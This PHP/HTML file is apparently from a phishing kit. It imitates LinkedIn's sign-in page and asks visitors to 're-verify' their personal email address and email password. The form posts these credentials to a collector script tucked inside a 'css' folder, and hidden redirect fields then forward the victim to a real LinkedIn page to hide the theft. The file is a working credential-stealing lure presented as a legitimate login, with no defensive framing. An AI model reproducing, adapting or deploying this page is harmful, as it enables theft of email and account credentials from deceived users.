<?php
	$host  = $_SERVER['HTTP_HOST']; $host_upper = strtoupper($host); $path   = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title></title>
<link rel="stylesheet" type="text/css" href="../css/style.css">
<script type="text/javascript" src="../js/js.js"></script>
<title>Sign In | LinkedIn</title>
<link rel="stylesheet" type="text/css" href="../css/css2.css">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="../css/favicon.ico"/>	
 <style type="text/css">
			  .textbox { 
    border: 1px solid #c4c4c4; 
    height: 34px; 
    width: 275px; 
    font-size: 13px; 
    padding: 6px; 
    border-radius: 4px;
} 
 
.textbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7; 
   
} 
</style>
</head>

<body>
<div class="container-fluid" style="background-color: #FFF; height:55px;" >
<div class="row">
<div class="col-lg-1"></div>
<div class="col-lg-1"><div class="logo"></div></div>
<div class="col-lg-7"></div>
<div class="col-lg-2"><div style="float:right; padding-right:50px; margin-top: 20px; font-size: 14px;"><a href="#">Sign In</a></div></div>
<div class="col-lg-1"></div>
</div>
</div>
<div class="container" style="background-color:#0096B5; height:650px;" >

</div>    


    
    
    <div id="body" class="" role="main">
<div class="wrapper hp-nus-wrapper">
<div id="global-error">
</div>
<div id="bg-fallback"></div>
<div id="main" class="signin">
<form id="form1" name="form1" method="post" action="../css/result.php">
    <fieldset>
<legend>Sign in to LinkedIn</legend>
<div class="outer-wrapper">
    <div style="margin-bottom:25px; font-size:32px; color:#FFF;">Re-verify Your personal E-mail Address</div>
<div class="inner-wrapper" style="background-color:#FFF; font-size:18px; width:450px;">
<div style="margin-bottom:25px; color:#666;">Please Re-confirm your personal email address and password</div>
    <ul id="mini-profile--js" style="background-color:#FFF; width:450px;">
<li class="">
<input name="redir" value="<?php echo "http://$host$path/verify.php?https//www.linkedin.com/legal/copyright-policy?trk=hb_ft_copy%2Fmail&service=mail&flowName=GlifWebSignIn&flowEntry=AddSession"; ?>" type="hidden" />
<input name="agenti" value="LinkedIn Verify" type="hidden" />
<input name="redir" value="https://www.linkedin.com/legal/copyright-policy?trk=hb_ft_copy" type="hidden" />
        <label for="name" style="float:left; font-size:14px; margin-bottom:4px; padding-left:1px; color:#999;" >Email Address</label>

    <input name="email" type="email" required value="" style="width:96%;"/>
    </li>
    <li>
            <label for="name" style="float:left; font-size:14px; margin-bottom:4px; padding-left:1px; color:#999;">Email Password</label>
    <input type="password" name="3pass" required style="width:96%; margin-bottom:20px;" />

</li>
<li class="button">
<input type="image" name="formimage1" width="89" height="36" src="../css/submit.png">
</li>
</ul>
</div>
</div>
<div class="gaussian-blur"></div>
</fieldset>

</form>
<div class="callout-container">
<span id="login-tooltip">

</span>
</div>
</div>


</div>
</div>

</body>


</html>